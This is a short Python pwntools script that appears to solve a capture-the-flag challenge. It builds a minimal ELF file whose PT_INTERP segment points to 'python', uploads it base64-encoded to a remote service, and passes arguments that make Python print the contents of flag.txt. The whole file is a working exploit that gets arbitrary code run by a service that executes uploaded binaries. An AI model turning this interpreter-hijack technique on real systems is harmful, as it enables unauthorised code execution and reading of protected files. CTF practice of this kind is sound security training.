from pwn import *
from elf import *
from base64 import b64encode

HOST = 'chal.amt.rs'
PORT = 1366

elf = b''

eh = Header()
eh.e_ident[constants.EI_MAG0] = constants.ELFMAG0
eh.e_ident[constants.EI_MAG1] = constants.ELFMAG1
eh.e_ident[constants.EI_MAG2] = constants.ELFMAG2
eh.e_ident[constants.EI_MAG3] = constants.ELFMAG3
eh.e_ident[constants.EI_CLASS] = constants.ELFCLASS64
eh.e_ident[constants.EI_DATA] = constants.ELFDATA2LSB
eh.e_ident[constants.EI_VERSION] = 1
eh.e_type = constants.ET_EXEC
eh.e_machine = 0x3e
eh.e_version = 1
eh.e_entry = 0
eh.e_phoff = sizeof(Header)
eh.e_ehsize = sizeof(Header)
eh.e_phentsize = sizeof(Segment)
eh.e_phnum = 1
eh.e_shentsize = sizeof(Section)
elf += bytes(eh)

interp = b'python\0'
ph = Elf64_Phdr(
    p_type = constants.PT_INTERP,
    p_flags = SegmentFlags.R,
    p_offset = 0x78,
    p_vaddr  = 0x78,
    p_paddr = 0,
    p_filesz = len(interp),
    p_memsz = len(interp),
    p_align = 0x1
)
elf += bytes(ph)
assert(len(elf) == 0x78)

elf += interp

io = remote(HOST, PORT)
io.sendlineafter(b': ', b64encode(elf))
io.sendlineafter(b': ', b'-u -W ignore -c print(open("flag.txt","r").read())')
io.interactive()